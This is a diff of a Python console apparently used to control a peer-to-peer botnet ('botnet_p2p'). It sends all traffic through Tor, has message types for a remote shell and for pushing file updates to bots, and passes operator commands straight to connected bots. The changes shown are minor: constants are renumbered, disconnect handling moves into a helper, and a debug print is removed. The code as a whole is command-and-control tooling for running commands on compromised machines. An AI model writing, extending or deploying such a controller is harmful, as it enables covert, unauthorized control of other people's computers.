@@ -8,29 +8,23 @@ import argparse
 import cmd2
 from cmd2 import with_argparser, with_category, categorize
 
-from botnet_p2p import ENCODING
+from botnet_p2p import ENCODING, EXIT
 from botnet_p2p.message import structure_msg, sign_structured_msg
 from botnet_p2p.security import decrypt
+from botnet_p2p.operations import close_terminal
 
 BUFFER_SIZE = 4096
 TOR_SERVER_PORT = 50001
 
-COMMAND = 1
+SHELL = 1
 UPDATE_FILE = 2
-SHELL = 3
-EXIT = "exit"
 
 readline.parse_and_bind("tab: complete")
-OPTION_PRIVATE_KEY = 1
 
 print_red = lambda msg: print(f"{Fore.LIGHTRED_EX}{msg}{Style.RESET_ALL}")
 print_yellow = lambda msg: print(f"{Fore.LIGHTYELLOW_EX}{msg}{Style.RESET_ALL}")
 print_green = lambda msg: print(f"{Fore.LIGHTGREEN_EX}{msg}{Style.RESET_ALL}")
 make_blue = lambda msg: f"{Fore.LIGHTBLUE_EX}{msg}{Style.RESET_ALL}"
-first_help_level = lambda parameter, description: "  {0:15}{1}\n".format(
-    parameter, description
-)
-second_help_level = lambda description: "  {0:10} {1}\n".format("", description)
 
 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
 socket.socket = socks.socksocket
@@ -174,9 +168,7 @@ class MyPrompt(cmd2.Cmd):
     @with_category(__botnet)
     def do_disconnect(self, input: str):
         if self.__socket:
-            coded_msg = EXIT.encode(ENCODING)
-            self.__socket.send(coded_msg)
-            self.__socket.close()
+            close_terminal(self.__socket)
         self.prompt = make_blue(f"chameleon> ")
         self.__terminal = False
 
@@ -192,7 +184,6 @@ class MyPrompt(cmd2.Cmd):
 
     def default(self, inp: cmd2.Statement):
         msg = inp.command_and_args
-        print(msg)
         if self.__terminal is True:
             coded_msg = msg.encode(ENCODING)
             self.__socket.send(coded_msg)
